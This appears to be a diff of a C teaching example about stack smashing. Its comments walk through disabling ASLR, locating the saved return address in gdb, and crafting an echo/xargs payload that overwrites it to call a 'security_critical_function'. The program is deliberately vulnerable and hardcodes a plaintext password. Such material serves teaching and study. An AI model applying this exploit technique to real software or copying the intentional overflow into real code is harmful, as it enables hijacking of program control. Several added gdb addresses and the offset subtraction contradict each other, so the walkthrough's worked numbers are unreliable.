@@ -1,8 +1,5 @@
 #include <stdio.h>
 #include <string.h>
-#include <ctype.h>
-
-#define CAESAR_SHIFT 1
 
 // The steps to reprocude this at home are a little bit technical
 // 1. First we need to disable a couple of security features that prevent this
@@ -26,21 +23,36 @@
 //    to overflow:
 //
 //    (gdb) p &local_buffer
-//    $1 = (char (*)[16]) 0x7fffffffda00
+//    $1 = (char (*)[16]) 0x7fffffffd990
 //
 //    That's an address on the stack and the return address is stored
 //    somewhere above. To find where the return address is I first look for
 //    its value:
 //    (gdb) info frame
-//    [...] 
-//    Saved registers:
-//     rbp at 0x7fffffffda10, rip at 0x7fffffffda18
+//    [...] saved rip = 0x4016da
 //
-//    So the return address (rip is the register containing the instruction
-//    pointer in x86-64) is saved at 0x7fffffffda18 on the stack. We now need
-//    to determine the offset between the start of the buffer we want to
-//    overflow and the location of the return address:
-//    0x7fffffffda18 - 0x7fffffffda00 = 0x18 (i.e. 24 bytes)
+//    The return address is 0x4016da! Now let's find it on the stack by
+//    printing the stack content, starting from the stack pointer (RSP register):
+//    gdb$ x/wx $rsp
+//    0x7fffffffd970: 0xffffd9e0  // nope
+//    gdb$ x/wx $rsp+8
+//    0x7fffffffd978: 0xffffdf9c  // nope
+//    gdb$ x/wx $rsp+16
+//    0x7fffffffd986: 0x00000000  // nope
+//    gdb$ x/wx $rsp+f
+//    0x7fffffffd97f: 0x00000000  // nope
+//    gdb$ x/wx $rsp+10
+//    0x7fffffffd980: 0x00000000  // nope
+//    gdb$ x/wx $rsp+18
+//    0x7fffffffd988: 0x00000000  // nope
+//    gdb$ x/wx $rsp+20
+//    0x7fffffffd990: 0xffffd9b0  // nope
+//    gdb$ x/wx $rsp+28
+//    0x7fffffffd998: 0x004016da  // found it!
+//
+//    So the offset between the start of the buffer we want to overflow and
+//    the return address is:
+//    0x7fffffffd980 - 0x7fffffffd998 = 0x18 (24 bytes)
 //    Conclusion: there are 24 bytes between local_buffer and the return address
 //
 // 3. Next we need to craft our payload, it should be consituted of 24 bytes
@@ -49,44 +61,28 @@
 //    easily:
 //    nm stack-smashing | grep security_critical_function
 //
-//    In my case it is at 0x40175e:
-//    000000000040175e T security_critical_function
+//    In my case it is at 0x401655:
+//    0000000000401655 T security_critical_function
 //
-//    So my payload will be: [24 bytes of padding][0x40175e]
+//    So my payload will be: [24 bytes of padding][0x401655]
 //
 // 4. We cannot inject bytes directly from the command line arguments, as what
 //    we put there are characters that get encoded with ascii code in memory,
 //    so we use echo -e to generate bytes than we feed these as the command
 //    line parameter to our target using xargs:
 //
-//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x5e\x17\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./stack-smashing
+//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x55\x16\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./stack-smashing
 //
 //    Notice how we have 24 bytes of garbage (\x11) and then the address of
 //    security_critical_function that will overwrite the return address:
-//    \x5e\x17\x40\x00\x00\x00\x00\x00 (in reverse order because x86-64 is
+//    \x55\x16\x40\x00\x00\x00\x00\x00 (in reverse order because x86-64 is
 //    little endian)
 //
 // Don't forget to re-enable ASLR when you are done:
 // echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 
-char *password = "upqtfdsfu";
 
-void caesar_encrypt(char* text) {
-    int i = 0;
-    char ch;
-    
-    while (text[i] != '\0') {
-        ch = text[i];
-
-        if (isupper(ch)) {
-            text[i] = (ch - 'A' + CAESAR_SHIFT) % 26 + 'A';
-        } else if (islower(ch)) {
-            text[i] = (ch - 'a' + CAESAR_SHIFT) % 26 + 'a';
-        }
-        
-        i++;
-    }
-}
+char *password = "super-secret";
 
 void security_critical_function() {
     printf("launching nukes!!\n");
@@ -107,7 +103,6 @@ int main(int argc, char **argv) {
     }
 
     preprocess_input(argv[1]);
-    caesar_encrypt(argv[1]);
 
     if(!strncmp(password, argv[1], strlen(password)))
         security_critical_function();
